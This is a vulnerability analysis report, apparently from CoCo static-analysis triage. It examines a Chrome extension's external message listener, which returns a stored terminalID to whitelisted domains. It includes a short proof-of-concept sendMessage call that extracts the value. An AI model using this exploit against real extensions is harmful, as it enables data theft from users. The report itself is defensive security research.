# CoCo Analysis: iebdppoockbmnhgckafipccifaiebkop

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iebdppoockbmnhgckafipccifaiebkop/opgen_generated_files/bg.js
Line 751: `var storage_local_get_source = {'key': 'value'};` (framework mock)
Line 970: `callback(items.terminalID);`

**Analysis:**

CoCo detected a flow from storage to external response. The actual extension code (starting at line 963) shows:

**Code:**

```javascript
// Background script - Message handler (lines 965-1006)
function Listener(req, sender, callback) {
    if (req) {
        if (req.message) {
            if (req.message === "terminalID") {
                // ← Storage read
                chrome.storage.local.get(["terminalID"], function (items) {
                    callback(items.terminalID); // ← Sends to external caller (attacker-controlled)
                });
            } else if (req.message === "installed") {
                callback(chrome.runtime.id);
            } else if (req.message === "tabDetails") {
                chrome.tabs.query({url: req.url}, (tabs) => {
                    callback(tabs);
                });
            } else if (req.message === "duplicate") {
                // ... tab duplication logic
            } else {
                callback(null);
            }
        }
    }
    return true;
}

chrome.runtime.onMessageExternal.addListener(Listener); // ← External message listener
```

**Manifest permissions:**
```json
"externally_connectable": {
    "matches": [
        "*://localhost/*",
        "*://knaps.local/*",
        "*://127.0.0.1/*",
        "*://*.knaps.com.au/*",
        "*://*.knaps.io/*",
        "*://*.biriteintranet.com.au/*"
    ]
},
"permissions": ["tabs", "storage"]
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://attacker.knaps.com.au)
chrome.runtime.sendMessage(
    'iebdppoockbmnhgckafipccifaiebkop',  // Extension ID
    { message: "terminalID" },
    function(response) {
        console.log("Stolen terminalID:", response); // ← Attacker receives stored data
    }
);
```

**Impact:** Information disclosure vulnerability. An attacker controlling any of the whitelisted domains (or compromising one) can extract the stored `terminalID` value from the extension's local storage. While manifest.json specifies externally_connectable restrictions, per the methodology we treat any chrome.runtime.onMessageExternal as exploitable if even ONE domain can trigger it.
